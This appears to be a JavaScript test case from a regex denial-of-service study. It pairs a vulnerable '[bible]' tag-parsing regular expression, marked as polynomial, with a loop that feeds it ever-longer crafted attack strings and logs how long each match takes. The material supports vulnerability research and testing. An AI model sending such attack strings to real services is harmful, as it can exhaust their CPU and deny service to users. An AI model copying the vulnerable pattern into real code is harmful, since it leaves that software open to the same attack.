/* 3471
 * \[bible[=]?([a-zäëïöüæø]*)\]((([0-9][[:space:]]?)?[a-zäëïöüæø]*[[:space:]]{1}([a-zäëïöüæø]*[[:space:]]?[a-zäëïöüæø]*[[:space:]]{1})?)([0-9]{1,3})(:{1}([0-9]{1,3})(-{1}([0-9]{1,3}))?)?)\[\\/bible\]
 * POLYNOMIAL
 * nums:3
 * POLYNOMIAL AttackString:"[bible]"+"a"*5000+"◎@! _1_POA(i)"
 */
var REGEX = new RegExp("\[bible[=]?([a-zäëïöüæø]*)\]((([0-9][[:space:]]?)?[a-zäëïöüæø]*[[:space:]]{1}([a-zäëïöüæø]*[[:space:]]?[a-zäëïöüæø]*[[:space:]]{1})?)([0-9]{1,3})(:{1}([0-9]{1,3})(-{1}([0-9]{1,3}))?)?)\[\\/bible\]")
for(var i = 1; i <= 5000000; i++) {
    var time = Date.now();
    var attack_str = '[bible]' + 'a'.repeat(i*10000) + '◎@! _1_POA(i)'
    REGEX.exec(attack_str)
    // REGEX.test(attack_str);
    // attack_str.search(REGEX)
    // attack_str.match(REGEX)
    var time_cost = Date.now() - time;
    console.log(i * 10000 + ": " + time_cost+" ms")
}